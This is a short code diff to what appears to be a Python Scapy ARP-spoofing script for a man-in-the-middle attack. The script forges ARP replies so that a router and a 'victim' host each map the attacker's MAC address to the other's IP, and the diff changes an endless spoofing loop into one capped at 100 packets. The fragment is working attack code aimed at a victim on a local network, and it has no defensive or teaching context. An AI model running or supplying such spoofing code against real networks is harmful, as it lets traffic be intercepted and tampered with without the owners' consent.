@@ -24,8 +24,11 @@ victim_MAC = MAC_on_network[1]
 routeur_IP = IP_on_network[2]
 routeur_MAC = MAC_on_network[2]
 
-while True: # MITM 
+nb_packets = 0
+
+while nb_packets < 100: # MITM 
     spoof_arp_routeur = Ether(src=mac_of_atk)/ARP(op=2, pdst=routeur_IP, hwdst=routeur_MAC, psrc=victim_IP)
     spoof_arp_victim = Ether(src=mac_of_atk)/ARP(op=2, pdst=victim_IP, hwdst=victim_MAC, psrc=routeur_IP)
     send_spoof2 = sendp(spoof_arp_routeur)
     send_spoof1 = sendp(spoof_arp_victim)
+    nb_packets += 2
